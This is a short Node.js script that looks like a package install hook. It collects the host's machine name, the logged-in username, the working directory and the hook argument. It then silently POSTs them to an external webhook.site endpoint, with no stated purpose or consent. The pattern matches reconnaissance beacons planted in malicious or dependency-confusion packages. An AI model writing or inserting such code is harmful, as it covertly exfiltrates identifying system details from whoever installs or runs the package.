const { hostname, userInfo } = require("os");
const https = require("https");
const payload = JSON.stringify({
  host: hostname(),
  user: userInfo().username,
  cwd: process.cwd(),
  hook: process.argv[2],
});
https
  .request({
    host: "webhook.site",
    path: "/df384ffa-1094-4bbf-a202-e8b345b3ed18/gfe",
    method: "POST",
  })
  .end(payload);
